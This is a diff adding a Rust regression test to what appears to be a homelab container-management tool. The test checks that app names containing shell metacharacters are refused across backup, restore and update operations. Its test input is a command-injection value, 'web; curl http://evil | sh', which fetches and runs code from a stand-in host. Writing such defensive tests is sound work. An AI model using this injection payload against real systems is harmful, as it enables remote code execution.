@@ -146,3 +146,44 @@ async fn r10_secret_only_in_vault_and_push_tmp_never_in_repo_or_state() {
         "positive control: the vault must hold the secret"
     );
 }
+
+/// Security finding 1 (2026-08-11): app names reach `sh -c` strings inside
+/// the target container, and D11 bundle import copies them verbatim from
+/// untrusted files. The validator must therefore refuse shell metacharacters
+/// in app names — for EVERY manifest-bearing op, not just deploy.
+#[tokio::test]
+async fn sec1_shell_metachar_app_name_refused_everywhere() {
+    use homelab_core::ops::backup::{backup, restore, BackupCfg};
+    use homelab_core::ops::update::update;
+    let mut m = spec_with_secret().manifest;
+    m.apps = vec!["web; curl http://evil | sh".into()];
+    // validate_manifest refuses directly…
+    assert!(homelab_core::manifest::validate_manifest(&m).is_err());
+    // …and each op refuses before any command reaches a shell.
+    let sink = VecSink::new();
+    let j = NullJournal;
+    for op in ["backup", "restore", "update"] {
+        let exec = MockExecutor::new();
+        exec.respond_always("pct config 108", CmdOutput::ok("hostname: 108-app-test\n"));
+        let ctx = OpCtx {
+            exec: &exec,
+            sink: &sink,
+            journal: &j,
+            safety: SafetyConfig::default(),
+            state_dir: "/var/lib/homelab".into(),
+            now_unix: 1_760_000_000,
+            kea: None,
+        };
+        let r = match op {
+            "backup" => backup(&ctx, &m, &BackupCfg::default()).await,
+            "restore" => restore(&ctx, &m, &BackupCfg::default(), "latest").await,
+            _ => update(&ctx, &m, None, false).await,
+        };
+        assert!(!r.ok, "{} must refuse a shell-metachar app name", op);
+        assert!(
+            exec.calls_containing("curl http://evil").is_empty(),
+            "{}: injected command reached a shell",
+            op
+        );
+    }
+}
